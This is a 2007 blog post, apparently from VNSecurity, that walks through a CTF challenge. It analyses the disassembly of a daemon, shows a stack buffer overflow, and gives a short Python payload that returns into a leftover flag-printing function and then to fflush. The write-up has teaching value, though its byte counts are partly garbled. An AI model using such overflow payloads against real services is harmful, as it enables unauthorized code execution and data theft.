<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width initial-scale=1">

  <title>Exploiting HTIB 2007 Kuala Lumpur CTF Daemon 05</title>
  <meta name="description" content="|  Daemon 05 has a simple buffer overflow error. Exploiting it by returning to a conveniently-left-behind function (an easter egg, I say).">
  <link rel="stylesheet" href="/assets/bootstrap.css">
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2007/09/14/exploiting-htib-2007-kuala-lumpur-ctf-daemon-05.html">
  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
  <script type="text/javascript" src="/assets/jquery.js"></script>
  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
  <script type="text/javascript">
    // WebFont.load({
    //     google: {
    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
    //     }
    // });
  </script>
</head>

    <body>
        <div class="wrapper kopa-shadow">
            <div class="row-fluid">
                <header id="page-header">
    <div class="clearfix" id="header-top">

        <div class="kp-headline-wrapper clearfix">
            <h6 class="kp-headline-title">Breaking news<span></span></h6>
            <div class="kp-headline clearfix">
                <dl class="ticker-1 clearfix">
                    
                    <dd>
                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
                    </dd>
                    
                </dl><!--ticker-1-->
            </div><!--kp-headline-->
        </div><!--kp-headline-wrapper-->

        <div class="social-search-box">

        </div>
        <!--social-search-box-->

    </div>
    <!--header-top-->

    <div class="clearfix" id="header-middle">
        <div id="logo-image">
            <a href="http://vnsec-new.cloudapp.net/wp">
                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
            </a>
        </div>
        <div class="top-banner">


        </div>
        <!--top-banner-->

    </div>

    <!--header-middle-->

    <div id="header-bottom">
        <nav id="main-nav">
            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/">Home</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/headlines/">headlines</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/tutorials/">tutorials</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/research/">research</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/misc/">misc</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/papers.html">Papers</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/tools.html">Tools</a>
                </li>
            </ul>
        </nav>
        <!--main-nav-->
    </div>
    <div>
        
    </div>
    <!--header-bottom-->
</header>
                <div id="main-content">
                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">

  <header class="post-header">
    <h4 class="entry-title">Exploiting HTIB 2007 Kuala Lumpur CTF Daemon 05</h4>
    <p class="post-meta">Sep 14, 2007 • lamer</p>
  </header>

  <article class="post-content">
    <h2 id="identify-main">Identify <code>main</code></h2>

<p>Like the previous blog post, let’s start with the <code>start</code> function.</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;080488B0                 public start
&lt;b&gt;.text:&lt;/b&gt;080488B0 start           proc near
&lt;b&gt;.text:&lt;/b&gt;080488B0                 &lt;b&gt;xor&lt;/b&gt;     &lt;b&gt;ebp&lt;/b&gt;, &lt;b&gt;ebp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B2                 &lt;b&gt;pop&lt;/b&gt;     &lt;b&gt;esi&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B3                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ecx&lt;/b&gt;, &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B5                 &lt;b&gt;and&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 0FFFFFFF0h
&lt;b&gt;.text:&lt;/b&gt;080488B8                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B9                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488BA                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;edx&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488BB                 &lt;b&gt;push&lt;/b&gt;    offset sub_804C650
&lt;b&gt;.text:&lt;/b&gt;080488C0                 &lt;b&gt;push&lt;/b&gt;    offset sub_804C5F0
&lt;b&gt;.text:&lt;/b&gt;080488C5                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;ecx&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488C6                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;esi&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488C7                 &lt;b&gt;push&lt;/b&gt;    offset main
&lt;b&gt;.text:&lt;/b&gt;080488CC                 &lt;b&gt;call&lt;/b&gt;    ___libc_start_main
</pre>

<p>We identify the <code>main</code> function as the last argument to <code>___libc_start_main</code>. So let’s get to it.</p>

<h2 id="analyze-main">Analyze <code>main</code></h2>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;08048ABE main            proc near               ; DATA XREF: start+17&uarr;o
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_518         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;518h
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_514         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;514h
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_510         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;510h
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_208         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;208h
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;ebp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ABF                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ebp&lt;/b&gt;, &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AC1                 &lt;b&gt;sub&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 518h       ; char *
&lt;b&gt;.text:&lt;/b&gt;08048AC7                 &lt;b&gt;and&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 0FFFFFFF0h
&lt;b&gt;.text:&lt;/b&gt;08048ACA                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048ACF                 &lt;b&gt;add&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0Fh
&lt;b&gt;.text:&lt;/b&gt;08048AD2                 &lt;b&gt;add&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0Fh
&lt;b&gt;.text:&lt;/b&gt;08048AD5                 &lt;b&gt;shr&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 4
&lt;b&gt;.text:&lt;/b&gt;08048AD8                 &lt;b&gt;shl&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 4
&lt;b&gt;.text:&lt;/b&gt;08048ADB                 &lt;b&gt;sub&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ADD                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, offset aCodedByXwings_ ; &quot;Coded By xWinGs. a code just to make yo&quot;...
&lt;b&gt;.text:&lt;/b&gt;08048AE4                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048AE9                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, offset aSecretCode ; &quot;Secret Code: &quot;
&lt;b&gt;.text:&lt;/b&gt;08048AF0                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048AF5                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;stdout
&lt;b&gt;.text:&lt;/b&gt;08048AFA                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AFD                 &lt;b&gt;call&lt;/b&gt;    _fflush
&lt;b&gt;.text:&lt;/b&gt;08048B02                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_510&lt;b&gt;]&lt;/b&gt;, 200h
&lt;b&gt;.text:&lt;/b&gt;08048B0A                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;var_208&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B10                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_514&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B14                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048B1B                 &lt;b&gt;call&lt;/b&gt;    _read
&lt;b&gt;.text:&lt;/b&gt;08048B20                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;dword_80529DC, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B25                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_510&lt;b&gt;]&lt;/b&gt;, offset aEtcFlagsDaemon ; &quot;/etc/flags/daemon05.txt&quot;
&lt;b&gt;.text:&lt;/b&gt;08048B2D                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;dword_80529DC
&lt;b&gt;.text:&lt;/b&gt;08048B32                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_514&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B36                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;var_208&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B3C                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B3F                 &lt;b&gt;call&lt;/b&gt;    sub_80489F4
</pre>

<p>First, a few calls to <code>printf</code> to advertise this is from xWinGs. Nothing fancy yet. Then a <code>read</code> of 0×200 (1024) bytes to <code>var_208</code>. So, let’s rename <code>var_208</code> to <code>input_buffer</code>. And also note that <code>input_buffer</code> is the first item on the stack. After <code>input_buffer</code> there comes the frame pointer and a return address.</p>

<p>With the same reasoning as in the previous post, we also rename <code>var_518</code> to <code>first_arg</code>, <code>var_514</code> to <code>second_arg</code>, and <code>var_510</code> to <code>third_arg</code>.</p>

<p>After the <code>read</code> is a check for score server packet. We’ll skip it. And here comes the juicy part.</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;08048B44                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;stdin
&lt;b&gt;.text:&lt;/b&gt;08048B49                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;third_arg&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B4D                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;second_arg&lt;b&gt;]&lt;/b&gt;, 300h
&lt;b&gt;.text:&lt;/b&gt;08048B55                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;input_buffer&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B5B                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;first_arg&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B5E                 &lt;b&gt;call&lt;/b&gt;    _fgets
&lt;b&gt;.text:&lt;/b&gt;08048B63                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;first_arg&lt;b&gt;]&lt;/b&gt;, offset aWrongCode_ ; &quot;Wrong Code.n&quot;
&lt;b&gt;.text:&lt;/b&gt;08048B6A                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048B6F                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048B74                 &lt;b&gt;leave&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B75                 &lt;b&gt;retn&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B75 main            endp
</pre>

<p>The next call is to <code>fgets</code> to read another, uhm, 0×300 bytes to <code>input_buffer</code>. And this is where overflow occurs. Remember that <code>input_buffer</code> is only 1024 byte long, and after it is the frame pointer and return address. So by overflowing <code>input_buffer</code> we are able to control the return address.</p>

<p>Ok, that’s all fine, but where do we want <code>main</code> to return to? A little digging around reveals this piece of unidentified code.</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;08048A60 locret_8048A60&lt;b&gt;:&lt;/b&gt;                         ; CODE XREF: sub_80489F4+29&uarr;j
&lt;b&gt;.text:&lt;/b&gt;08048A60                 &lt;b&gt;leave&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A61                 &lt;b&gt;retn&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A61 sub_80489F4     endp
&lt;b&gt;.text:&lt;/b&gt;08048A61
&lt;b&gt;.text:&lt;/b&gt;08048A62 ; ---------------------------------------------------------------------------
&lt;b&gt;.text:&lt;/b&gt;08048A62                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;ebp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A63                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ebp&lt;/b&gt;, &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A65                 &lt;b&gt;sub&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 48h
&lt;b&gt;.text:&lt;/b&gt;08048A68                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;4&lt;b&gt;]&lt;/b&gt;, offset aR ; &quot;r&quot;
&lt;b&gt;.text:&lt;/b&gt;08048A70                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, offset aEtcFlagsDaemon ; &quot;/etc/flags/daemon05.txt&quot;
&lt;b&gt;.text:&lt;/b&gt;08048A77                 &lt;b&gt;call&lt;/b&gt;    _fopen
&lt;b&gt;.text:&lt;/b&gt;08048A7C                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;0Ch&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A7F                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;0Ch&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A82                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;8&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A86                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;4&lt;b&gt;]&lt;/b&gt;, 20h
&lt;b&gt;.text:&lt;/b&gt;08048A8E                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;38h&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A91                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A94                 &lt;b&gt;call&lt;/b&gt;    _fgets
&lt;b&gt;.text:&lt;/b&gt;08048A99                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;0Ch&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A9C                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A9F                 &lt;b&gt;call&lt;/b&gt;    _fclose
&lt;b&gt;.text:&lt;/b&gt;08048AA4                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;38h&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AA7                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;4&lt;b&gt;]&lt;/b&gt;,;;; &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AAB                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, offset &lt;b&gt;aS&lt;/b&gt; ; &quot;n%s&quot;
&lt;b&gt;.text:&lt;/b&gt;08048AB2                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048AB7                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048ABC                 &lt;b&gt;leave&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ABD                 &lt;b&gt;retn&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE ; Attributes: bp-based frame
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE main            proc near               ; DATA XREF: start+17&uarr;o
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE first_arg       &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;518h
&lt;b&gt;.text:&lt;/b&gt;08048ABE second_arg      &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;514h
&lt;b&gt;.text:&lt;/b&gt;08048ABE third_arg       &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;510h
&lt;b&gt;.text:&lt;/b&gt;08048ABE input_buffer    &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;208h
</pre>

<p>Look at <code>08048A62</code>! It’s a function prologue. And indeed from <code>08048A62</code> to <code>08048ABD</code> is a proper function! What great is that it opens, reads, and prints the flag out! This is so convenient!</p>

<h2 id="exploit-it">Exploit it</h2>

<p>Now, let’s gather what we’ve have. We can control where main returns to, and we know there’s a function that suits our purpose. Therefore, the challenge is… none. We just return to this function!</p>

<p>With that tactic, our exploit is as trivial as constructing a buffer containing all <code>08048A62</code>. And how hard could it be? Two lines of Python code!</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">import struct
buffer = struct.pack("I", 0x08048A62) * 1000
</pre>

<h2 id="remotely-exploit-it">Remotely exploit it</h2>

<p>If you tried out the buffer above, you might find that it didn’t work remotely. This is because the easter-egg function uses <code>printf</code> to print out the flag. It is common knowledge that <code>printf</code> buffers its content. If the output stream is connected to a console window, the buffering is line-based, otherwise it is block-based. In our case, the output stream is connected to a socket, so the buffering is block-based. Usually, this block is 8 KBytes. Each call to the easter-egg only prints out about 20 bytes. So, to fill this buffer, we will need at least 409 calls to the easter-egg function, or we need to put in 409 * 4 = 0×664 bytes. However, only 0×300 bytes are read in. So this approach fails.</p>

<p>Another approach is to flush the stream after <code>printf</code>. Luckily, this is doable by returning to <code>08048AF5</code>. At that address, there is a call to <code>fflush</code> on <code>stdout</code>. Again, we only use existing code.</p>

<p>In summary, in order to exploit daemon05 remotely, we will have to change our buffer to look like:</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">buffer = struct.pack("I", 0x08048A62) * 300 + "xF5x8Ax04x08" + "x0A"
</pre>

<h2 id="observation">Observation</h2>

<p>Well, what should I say? Thank you, xWinGs, for this twisted fun!</p>

  </article>

</div>

<hr/>
<h2>Comments</h2>
<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2007/09/14/exploiting-htib-2007-kuala-lumpur-ctf-daemon-05.html" data-num-posts="4" data-width="706"></div>

                </div>
                <script type="text/javascript">
jQuery(function() {
    var _scroll = {
        delay: 1000,
        easing: 'linear',
        items: 1,
        duration: 0.07,
        timeoutDuration: 0,
        pauseOnHover: 'immediate'
    };
    jQuery('.ticker-1').carouFredSel({
        width: 1000,
        align: false,
        items: {
            width: 'variable',
            height: 40,
            visible: 1
        },
        scroll: _scroll
    });

    //  set carousels to be 100% wide
    jQuery('.caroufredsel_wrapper').css('width', '100%');
});
</script>
<script>
  (function() {
    var cx = '003844801333820630405:hlapfwpe2eq';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>
<gcse:search></gcse:search>
<footer class="site-footer">

  <div class="wrapper">

    <div class="footer-col-wrapper">
      
    </div>

  </div>

</footer>

            </div>
        </div>
        <script>(function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
          fjs.parentNode.insertBefore(js, fjs);
        }(document, "script", "facebook-jssdk"));</script>
    </body>
</html>